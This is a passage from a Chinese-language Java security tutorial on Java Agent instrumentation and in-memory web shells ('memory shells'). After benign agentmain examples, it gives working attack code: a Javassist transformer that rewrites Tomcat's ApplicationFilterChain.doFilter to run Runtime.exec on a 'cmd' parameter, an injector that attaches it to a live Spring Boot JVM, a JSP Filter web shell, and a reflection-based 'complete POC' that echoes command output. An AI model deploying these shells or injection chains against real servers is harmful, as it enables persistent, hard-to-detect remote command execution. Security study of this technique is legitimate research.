        }
    }
}
```

同时配置`MANIFEST.MF`文件

```xml
Manifest-Version: 1.0
Agent-Class: com.java.agentmain.agent.Java_Agent_agentmain

```

编译打包成`jar`文件`out/artifacts/Java_Agent_jar/Java_Agent.jar`
最后编写一个`Inject_Agent`类，获取特定`JVM`的`PID`并注入`Agent`

```java
package com.java.inject;
 
import com.sun.tools.attach.*;
 
import java.io.IOException;
import java.util.List;
 
public class Inject_Agent {
    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {
        //调用VirtualMachine.list()获取正在运行的JVM列表
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        for(VirtualMachineDescriptor vmd : list){
 
            //遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent
            if(vmd.displayName().equals("Sleep_Hello")){
 
                //连接指定JVM
                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());
                //加载Agent
                virtualMachine.loadAgent("out/artifacts/Java_Agent_jar/Java_Agent.jar");
                //断开JVM连接
                virtualMachine.detach();
            }
 
        }
    }
}
```

首先启动`Sleep_Hello`目标`JVM`
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1713239160614-c27f3fb7-5bae-4565-b347-20cc1f2a7c5f.png)
然后运行`Inject_Agent`类，注入`Agent`
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1713239168259-9dfca175-fd77-42a0-af5f-3e804ee27183.png)
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1713239178939-c1793c88-eac7-4361-a6a5-031399696c07.png)

#### 6.2.2.3、Instrumentation

`Instrumentation`是 `JVMTIAgent`（`JVM Tool Interface Agent`）的一部分，`Java agent`通过这个类和目标 `JVM` 进行交互，从而达到修改数据的效果。
其在`Java`中是一个接口，常用方法如下

```java
public interface Instrumentation {
    
    //增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。
    void addTransformer(ClassFileTransformer transformer, boolean canRetransform);
 
    //在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。
    void addTransformer(ClassFileTransformer transformer);
 
    //删除一个类转换器
    boolean removeTransformer(ClassFileTransformer transformer);
 
 
    //在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。
    void retransformClasses(Class<?>... classes) throws UnmodifiableClassException;
 
 
 
    //判断一个类是否被修改
    boolean isModifiableClass(Class<?> theClass);
 
    // 获取目标已经加载的类。
    @SuppressWarnings("rawtypes")
    Class[] getAllLoadedClasses();
 
    //获取一个对象的大小
    long getObjectSize(Object objectToSize);
 
}
```

##### 获取目标JVM已加载类

下面我们简单实现一个能够获取目标`JVM`已加载类的`agentmain-Agent`

```java
package com.java.agentmain.instrumentation;
 
import java.lang.instrument.Instrumentation;
 
public class Java_Agent_agentmain_Instrumentation {
    public static void agentmain(String args, Instrumentation inst) throws InterruptedException {
        Class [] classes = inst.getAllLoadedClasses();
 
        for(Class cls : classes){
            System.out.println("------------------------------------------");
            System.out.println("加载类: "+cls.getName());
            System.out.println("是否可被修改: "+inst.isModifiableClass(cls));
        }
    }
}
```

注入目标进程，结果如下
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1713257759516-5eb6ea46-e7ea-4596-bdfb-c7fb6ac9a67f.png)

```javascript
Hello World!
Hello World!
------------------------------------------
加载类: com.java.agentmain.instrumentation.Java_Agent_agentmain_Instrumentation
是否可被修改: true
------------------------------------------
加载类: Sleep_Hello
是否可被修改: true
------------------------------------------
加载类: com.intellij.rt.execution.application.AppMainV2$1
是否可被修改: true
------------------------------------------
加载类: com.intellij.rt.execution.application.AppMainV2
是否可被修改: true
------------------------------------------
加载类: com.intellij.rt.execution.application.AppMainV2$Agent
是否可被修改: true
 
...
```

##### transform

在`Instrumentation`接口中，我们可以通过`addTransformer()`来添加一个`transformer`（转换器），关键属性就是`ClassFileTransformer`类。

```java
//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。
    void addTransformer(ClassFileTransformer transformer, boolean canRetransform);
```

`ClassFileTransformer`接口中只有一个`transform()`方法，返回值为字节数组，作为转换后的字节码注入到目标`JVM`中。

```java
public interface ClassFileTransformer {
 
    /**
     * 类文件转换方法，重写transform方法可获取到待加载的类相关信息
     *
     * @param loader              定义要转换的类加载器；如果是引导加载器如Bootstrap ClassLoader，则为 null
     * @param className           完全限定类内部形式的类名称,格式如:java/lang/Runtime
     * @param classBeingRedefined 如果是被重定义或重转换触发，则为重定义或重转换的类；如果是类加载，则为 null
     * @param protectionDomain    要定义或重定义的类的保护域
     * @param classfileBuffer     类文件格式的输入字节缓冲区（不得修改）
     * @return 返回一个通过ASM修改后添加了防御代码的字节码byte数组。
     */
    
    byte[] transform(  ClassLoader         loader,
                String              className,
                Class<?>            classBeingRedefined,
                ProtectionDomain    protectionDomain,
                byte[]              classfileBuffer)
        throws IllegalClassFormatException;
}
```

在通过 `addTransformer` 注册一个`transformer`后，每次定义或者重定义新类都会调用`transformer`。所谓定义，即是通过`ClassLoader.defineClass`加载进来的类。而重定义是通过`Instrumentation.redefineClasses`方法重定义的类。
当存在多个转换器时，转换将由 `transform` 调用链组成。 也就是说，一个 `transform` 调用返回的 `byte` 数组将成为下一个调用的输入（通过 `classfileBuffer` 参数）。
转换将按以下顺序应用：

- 不可重转换转换器
- 不可重转换本机转换器
- 可重转换转换器
- 可重转换本机转换器

至于`transformer`中对字节码的具体操作，则需要使用到`Javassisit`类。在[这篇文章](https://goodapple.top/archives/1145#header-id-20)中，我已经介绍过了`Javassist`的用法。下面我就来修改一个正在运行`JVM`的字节码。
[JavaSsist解析](https://www.yuque.com/exmmmys/wnuua5/qm5rzub83v01vkgp?view=doc_embed)

##### 修改目标JVM的Class的字节码

首先编写一个目标类`com.sleep.hello.Sleep_Hello.java`

```java
package com.sleep.hello;

import static java.lang.Thread.sleep;

public class Hello_Sleep {
    public static void main(String[] args) throws InterruptedException {
        while (true){
            hello();
            sleep(3000);
        }
    }

    public static void hello(){
        System.out.println("Hello World!");
    }
}
```

编写一个`agentmain-Agent`

```java
package com.java.agentmain.agent;

import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;

public class TransFormMain {
    public static void agentmain(String args, Instrumentation inst) throws InterruptedException, UnmodifiableClassException {
        Class [] classes = inst.getAllLoadedClasses();

        //获取目标JVM加载的全部类
        for(Class cls : classes){
            if (cls.getName().equals("com.sleep.hello.Sleep_Hello")){

                //添加一个transformer到Instrumentation，并重新触发目标类加载
                inst.addTransformer(new Hello_Transform(),true);
                inst.retransformClasses(cls);
            }
        }
    }
}
```

继承`ClassFileTransformer`类编写一个`transformer`，修改对应类的字节码

```java
package com.java.agentmain.agent;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

public class Hello_Transform implements ClassFileTransformer {
    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        try {

            //获取CtClass 对象的容器 ClassPool
            ClassPool classPool = ClassPool.getDefault();

            //添加额外的类搜索路径
            if (classBeingRedefined != null) {
                ClassClassPath ccp = new ClassClassPath(classBeingRedefined);
                classPool.insertClassPath(ccp);
            }

            //获取目标类
            CtClass ctClass = classPool.get("com.sleep.hello.Sleep_Hello");

            //获取目标方法
            CtMethod ctMethod = ctClass.getDeclaredMethod("hello");

            //设置方法体
            String body = "{System.out.println(\"Hacker!\");}";
            ctMethod.setBody(body);

            //返回目标类字节码
            byte[] bytes = ctClass.toBytecode();
            return bytes;

        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }
}
```

需要手动导入`tool.jar`
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1713340230685-bb6b33b8-0996-44c8-bae6-358ca6b249c5.png)
` MANIFEST.MF`配置

```xml
Manifest-Version: 1.0
Agent-Class: com.java.agentmain.agent.TransFormMain

```

打包成`jar`
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1713340296483-cddd8136-e278-480f-8e57-9e9cd1bcf450.png)
首先运行目标类，然后运行`Inject_Agent`类，注入`Agent`
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1713340370374-de6dbefe-ee4a-4e7a-8b2a-55f3aa6a9c33.png)
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1713343919518-7f35df62-74fa-4dbc-b71b-20eeb46db5a5.png)

## 6.3、Instrumentation的局限性

大多数情况下，我们使用`Instrumentation`都是使用其字节码插桩的功能，简单来说就是类重定义功能（`Class Redefine`），但是有以下局限性：
`premain`和`agentmain`两种方式修改字节码的时机都是类文件加载之后，也就是说必须要带有`Class`类型的参数，不能通过字节码文件和自定义的类名重新定义一个本来不存在的类。
类的字节码修改称为类转换(`Class Transform`)，类转换其实最终都回归到类重定义`Instrumentation#redefineClasses`方法，此方法有以下限制：

1. 新类和老类的父类必须相同
2. 新类和老类实现的接口数也要相同，并且是相同的接口
3. 新类和老类访问符必须一致。 新类和老类字段数和字段名要一致
4. 新类和老类新增或删除的方法必须是`private static/final`修饰的
5. 可以修改方法体

## 6.4、Agent内存马

现在我们可以通过`Java Agent`技术来修改正在运行`JVM`中的方法体，那么我们可以`Hook`一些`JVM`一定会调用、并且`Hook`之后不会影响正常业务逻辑的的方法来实现内存马。
这里我们以`Spring Boot`为例，来实现一个`Agent`内存马

### 6.4.1、Spring Boot中的Tomcat

我们知道，`Spring Boot`中内嵌了一个`embed Tomcat`作为其启动容器。既然是`Tomcat`，那肯定有相应的组件容器。我们先来调试一下`SpringBoot`，部分调用栈如下

```java
Context:20, Context_Learn (com.example.spring_controller)
...
(org.springframework.web.servlet.mvc.method.annotation)
handleInternal:808, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation)
handle:87, AbstractHandlerMethodAdapter (org.springframework.web.servlet.mvc.method)
doDispatch:1067, DispatcherServlet (org.springframework.web.servlet)
doService:963, DispatcherServlet (org.springframework.web.servlet)
processRequest:1006, FrameworkServlet (org.springframework.web.servlet)
doGet:898, FrameworkServlet (org.springframework.web.servlet)
service:655, HttpServlet (javax.servlet.http)
service:883, FrameworkServlet (org.springframework.web.servlet)
service:764, HttpServlet (javax.servlet.http)
internalDoFilter:227, ApplicationFilterChain (org.apache.catalina.core)
doFilter:162, ApplicationFilterChain (org.apache.catalina.core)
doFilter:53, WsFilter (org.apache.tomcat.websocket.server)
internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)
doFilter:162, ApplicationFilterChain (org.apache.catalina.core)
doFilterInternal:100, RequestContextFilter (org.springframework.web.filter)
doFilter:117, OncePerRequestFilter (org.springframework.web.filter)
internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)
doFilter:162, ApplicationFilterChain (org.apache.catalina.core)
doFilterInternal:93, FormContentFilter (org.springframework.web.filter)
doFilter:117, OncePerRequestFilter (org.springframework.web.filter)
internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)
doFilter:162, ApplicationFilterChain (org.apache.catalina.core)
doFilterInternal:201, CharacterEncodingFilter (org.springframework.web.filter)
doFilter:117, OncePerRequestFilter (org.springframework.web.filter)
internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)
doFilter:162, ApplicationFilterChain (org.apache.catalina.core)
...
```

可以看到会按照责任链机制反复调用`ApplicationFilterChain#doFilter()`方法

```java
public void doFilter(ServletRequest request, ServletResponse response)
        throws IOException, ServletException {
 
        if( Globals.IS_SECURITY_ENABLED ) {
            final ServletRequest req = request;
            final ServletResponse res = response;
            try {
                java.security.AccessController.doPrivileged(
                        (java.security.PrivilegedExceptionAction<Void>) () -> {
                            internalDoFilter(req,res);
                            return null;
                        }
                );
            } ...
            }
        } else {
            internalDoFilter(request,response);
        }
    }
```

跟到`internalDoFilter()`方法中

```java
private void internalDoFilter(ServletRequest request,
                                  ServletResponse response)
        throws IOException, ServletException {
 
        // Call the next filter if there is one
        if (pos < n) {
            ...
        }
}
```

以上两个方法均拥有`ServletRequest`和`ServletResponse`，并且`hook`不会影响正常的业务逻辑，因此很适合作为内存马的回显。下面我们尝试利用

### 6.4.2、利用Java Agent实现Spring Filter内存马

我们复用上面的`agentmain-Agent`，修改字节码的关键在于`transformer()`方法，因此我们重写该方法即可

```java
package com.java.agentmain.instrumentation.transformer;
 
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
 
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;
 
public class Filter_Transform implements ClassFileTransformer {
    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        try {
 
            //获取CtClass 对象的容器 ClassPool
            ClassPool classPool = ClassPool.getDefault();
 
            //添加额外的类搜索路径
            if (classBeingRedefined != null) {
                ClassClassPath ccp = new ClassClassPath(classBeingRedefined);
                classPool.insertClassPath(ccp);
            }
 
            //获取目标类
            CtClass ctClass = classPool.get("org.apache.catalina.core.ApplicationFilterChain");
 
            //获取目标方法
            CtMethod ctMethod = ctClass.getDeclaredMethod("doFilter");
 
            //设置方法体
            String body = "{" +
                    "javax.servlet.http.HttpServletRequest request = $1\n;" +
                    "String cmd=request.getParameter(\"cmd\");\n" +
                    "if (cmd !=null){\n" +
                    "  Runtime.getRuntime().exec(cmd);\n" +
                    "  }"+
                    "}";
            ctMethod.setBody(body);
 
            //返回目标类字节码
            byte[] bytes = ctClass.toBytecode();
            return bytes;
 
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }
}
```

```java
package com.java.filter.transform.agent;

import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;

public class Java_Agent_agentmain_transform {
    public static void agentmain(String args, Instrumentation inst) throws InterruptedException, UnmodifiableClassException {
        Class [] classes = inst.getAllLoadedClasses();

        //获取目标JVM加载的全部类
        for(Class cls : classes){
            if (cls.getName().equals("com.example.spring.SpringDemoApplication")){
                //添加一个transformer到Instrumentation，并重新触发目标类加载
                inst.addTransformer(new Filter_Transform(),true);
                inst.retransformClasses(cls);
            }
        }
    }
}

```

`Inject_Agent_Spring`类如下

```java
package com.java.inject;

import com.sun.tools.attach.*;

import java.io.IOException;
import java.util.List;

public class Inject_Agent_Spring {
    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {
        //调用VirtualMachine.list()获取正在运行的JVM列表
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        for(VirtualMachineDescriptor vmd : list){
            //遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent
            if(vmd.displayName().equals("com.example.spring.SpringDemoApplication")){

                //连接指定JVM
                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());
                //加载Agent
                virtualMachine.loadAgent("out/artifacts/ts_jar/TransformDemo.jar");
                //断开JVM连接
                virtualMachine.detach();
            }
//            System.out.println(vmd.displayName());

        }
    }
}
```

# 7、内存马回显技术

`Tomcat Filter`回显内存马示例

```java
<%! public class Shell_Filter implements Filter {
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        String cmd = request.getParameter("cmd");
        response.setContentType("text/html; charset=UTF-8");
        PrintWriter writer = response.getWriter();
        if (cmd != null) {
            try {
                InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
 
                //将命令执行结果写入扫描器并读取所有输入
                Scanner scanner = new Scanner(in).useDelimiter("\\A");
                String result = scanner.hasNext()?scanner.next():"";
                scanner.close();
                writer.write(result);
                writer.flush();
                writer.close();
            } catch (IOException e) {
                e.printStackTrace();
            } catch (NullPointerException n) {
                n.printStackTrace();
            }
        }
        chain.doFilter(request, response);
    }
}
%>
```

## 7.1、ThreadLocal Response回显

不研究

## 7.2、通过全局存储Response回显

不研究

### 7.2.1、完整POC

```java
import org.apache.catalina.connector.Connector;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardService;
import org.apache.coyote.ProtocolHandler;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;
import org.apache.tomcat.util.net.AbstractEndpoint;
 
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.util.List;
import java.util.Scanner;
 
@WebServlet("/response")
public class Tomcat_Echo_Response extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
 
        //获取StandardService
        org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
 
        System.out.println(standardContext);
 
        try {
            //获取ApplicationContext
            Field applicationContextField = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context");
            applicationContextField.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(standardContext);
 
            //获取StandardService
            Field standardServiceField = Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service");
            standardServiceField.setAccessible(true);
            StandardService standardService = (StandardService) standardServiceField.get(applicationContext);
 
            //获取Connector
            Field connectorsField = Class.forName("org.apache.catalina.core.StandardService").getDeclaredField("connectors");
            connectorsField.setAccessible(true);
            Connector[] connectors = (Connector[]) connectorsField.get(standardService);
            Connector connector = connectors[0];
 
            //获取Handler
            ProtocolHandler protocolHandler = connector.getProtocolHandler();
            Field handlerField = Class.forName("org.apache.coyote.AbstractProtocol").getDeclaredField("handler");
            handlerField.setAccessible(true);
            org.apache.tomcat.util.net.AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) handlerField.get(protocolHandler);
 
            //获取内部类AbstractProtocol$ConnectionHandler的global属性
            Field globalHandler = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global");
            globalHandler.setAccessible(true);
            RequestGroupInfo global = (RequestGroupInfo) globalHandler.get(handler);
 
            //获取processors
            Field processorsField = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
            processorsField.setAccessible(true);
            List<RequestInfo> requestInfoList = (List<RequestInfo>) processorsField.get(global);
 
            //获取request和response
            Field requestField = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
            requestField.setAccessible(true);
            for (RequestInfo requestInfo : requestInfoList){
 
                //获取org.apache.coyote.Request
                org.apache.coyote.Request request = (org.apache.coyote.Request) requestField.get(requestInfo);
 
                //通过org.apache.coyote.Request的Notes属性获取继承HttpServletRequest的org.apache.catalina.connector.Request
                org.apache.catalina.connector.Request http_request = (org.apache.catalina.connector.Request) request.getNote(1);
                org.apache.catalina.connector.Response http_response = http_request.getResponse();
 
                PrintWriter writer = http_response.getWriter();
                String cmd = http_request.getParameter("cmd");
 
                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                Scanner scanner = new Scanner(inputStream).useDelimiter("\\A");
                String result = scanner.hasNext()?scanner.next():"";
                scanner.close();
                writer.write(result);
                writer.flush();
                writer.close();
            }
 
 
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
    }
}
```
